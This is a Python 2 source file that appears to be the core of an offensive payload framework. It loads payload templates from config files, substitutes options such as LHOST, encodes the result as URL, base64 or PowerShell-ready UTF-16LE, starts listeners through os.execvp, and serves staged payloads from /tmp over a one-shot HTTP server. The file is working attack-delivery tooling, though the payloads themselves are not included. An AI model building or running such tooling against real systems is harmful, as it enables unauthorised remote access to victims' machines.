import random, string #for name generation
import SimpleHTTPServer, SocketServer, os #for serving and cleaning the staged payloads
import urllib, base64 #encoding of the payloads
import terminaltables, os, re  #drawing tables

class Connector:
    title=""
    info=""
    required_opts=[]
    app=""
    params=[]
    pre_exec=""
    recv_opts={}
    def __init__(self,config_file):

        for line in open(config_file,'rt'):
            data=line.rstrip('\n').split("=",1)
            if data[0].lower()=="title":
                self.title=data[1]
            elif data[0].lower()=="info":
                self.info=data[1]
            elif data[0].lower()=="required_opts":         
                self.required_opts=data[1].split(';')
            elif data[0].lower()=="app":
                self.app=data[1]
            elif data[0].lower()=="params":
                self.params=data[1].split(';')
            elif data[0].lower()=="pre_exec":
                self.pre_exec=data[1]

    def __checkOpts(self,opts):
        for opt in self.required_opts:
            if opt not in opts:
                print "[-]",opt, "NOT FOUND"
                print "\n[-] ", self.info
                return False
        return True

    def requiredOpts(self):
        return self.required_opts

    def launch(self,opts):
        if self.__checkOpts(opts):
            self.recv_opts=opts
            exec_params=[]
            exec_params.append(self.app)
            for param in self.params:
                replaced=""
                for opt in opts:
                    replaced=param
                    if opt in param:
                        replaced=param.replace(opt,opts[opt])
                        break
                exec_params.append(replaced)
            #we need to exec here the connector
            print "\n[*]", self.title, "-", self.info
            #if we need to execute something before that's the moment
            if self.pre_exec != "":
                os.system(self.pre_exec)
            #executing the connector
            print "[*] Listener cmd: "+" ".join(exec_params)
            os.execvp(self.app,exec_params)
        else:
            return False

class Payload:
    required_opts=[]
    recv_opts={}
    config_file=""
    title=""
    info=""
    payload=""
    connector=""
    is_binary=False

    def __init__(self,config_file):
        self.config_file=config_file    
        multiline=False
        binary=False
        for line in open(config_file,'rt'):
            if multiline or self.is_binary:
                if "%%payload_end%%" not in line:
                    self.payload+=line
                else: 
                    multiline=False
            data=line.rstrip('\n').split("=",1)
            if data[0].lower()=="payload":
                if data[1]=="multiline":
                    multiline=True
                elif data[1]=="binary":
                    self.is_binary=True
                else:
                    self.payload=data[1]
            elif data[0].lower()=="required_opts":         
                self.required_opts=data[1].split(';')
            elif data[0].lower()=="title":         
                self.title=data[1]
            elif data[0].lower()=="info":         
                self.info=data[1]
            elif data[0].lower()=="connector":
                self.connector=data[1]

    def __checkOpts(self,opts):
        for opt in self.required_opts:
            if opt not in opts:
                print opt, "NOT FOUND"
                print self.info
                return False
        return True

    def requiredOpts(self):
        return self.required_opts

    def getUrlencoded(self):
        return urllib.quote(self.payload,safe='')

    def getB64UTF16LE(self):
        #interesting to use with Invoke-PSInject script
        return base64.b64encode(self.payload.encode('UTF-16LE'))

    def getB64(self):
        return base64.b64encode(self.payload)
    
    def getConnector(self):
        if self.connector!="":
            return self.connector
        else:
            return False
    
    def getInfo(self):
        #drawing info table using terminaltables
        data = []
        #getting number of rows to adjust the table
        rows, columns = os.popen('stty size', 'r').read().split()
        #splitting payload to adapt to terminal
        inf = re.sub("(.{"+str(int(columns)-17)+"})", "\\1\n", self.info, 0, re.DOTALL)
        data.append(['Info',inf])
        data.append(['Req.Opts',self.required_opts])
        if self.connector!="":
            data.append(['Connector',self.connector])
        if '\n' in self.payload:
            data.append(["Payload","Multiline"])
        else:
            #splitting payload to adapt to terminal
            pay = re.sub("(.{"+str(int(columns)-17)+"})", "\\1\n", self.payload, 0, re.DOTALL)
            data.append(["Payload",pay])
        table = terminaltables.SingleTable(data)
        table.title = self.title
        table.inner_row_border = True
        return table.table

    def getBrief(self):
        data='[*] '+self.config_file.split('/')[-1]+' => '+self.title
        return data

    def getIsBinary(self):
        return(self.is_binary)

    def randomStr(self, l):
        return ''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase+string.digits) for _ in range(l))

    def generatePayload(self,opts):
        if "RNDSTR" in self.payload:
            self.payload=self.payload.replace("RNDSTR",self.randomStr(6))
        if self.__checkOpts(opts):
            self.recv_opts=opts
            for opt in opts:
                self.payload=self.payload.replace(opt,opts[opt])
            return True
        else:
            return False

class StagerHTTP(Payload):
    temp_path="/tmp"
    staged_payload=""
    http_requests=1
    filename=""

    def __init__(self, config_file):
        Payload.__init__(self, config_file)
        for line in open(config_file,'rt'):
            data=line.rstrip('\n').split("=",1)
            if data[0].lower()=="http_requests":
                self.http_requests=int(data[1])
        #generate random filename
        self.filename=self.randomStr(10)

    def setStagedPayload(self,stagedPayload):
        self.staged_payload=stagedPayload

    def setIsBinary(self,value):
        self.is_binary=value

    def generatePayload(self,opts):
        opts['FILENAME']=self.filename
        if Payload.generatePayload(self,opts):
            return True
        else:
            return False

    def serveStaged(self):
        #save staged payload into a temp file
        if self.is_binary:
            f=open(self.temp_path+'/'+self.filename,'wb')
            f.write(base64.b64decode(self.staged_payload))
        else:
            f=open(self.temp_path+'/'+self.filename,'wt')
            f.write(self.staged_payload)
        f.close()
        #start webserver
        try:
            os.chdir(self.temp_path)
            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
            httpd = SocketServer.TCPServer((self.recv_opts['LHOST'], int(self.recv_opts['SPORT'])), Handler)
            print "[*] Serving stage at port", self.recv_opts['SPORT']
            c=0
            while(c<self.http_requests):
                httpd.handle_request()
                print "[*] Part "+str(c+1)+" of "+str(self.http_requests)+" sent"
                c+=1
            httpd.socket.close()
        except KeyboardInterrupt:
    	    print ' received, shutting down the web server'
            httpd.socket.close()
            os.remove(self.temp_path+"/"+self.filename)
            exit()
        except:
            print '[!] Error serving your payload.'
            os.remove(self.temp_path+"/"+self.filename)
            exit()
        try:
            os.remove(self.temp_path+"/"+self.filename)
        except:     
            pass


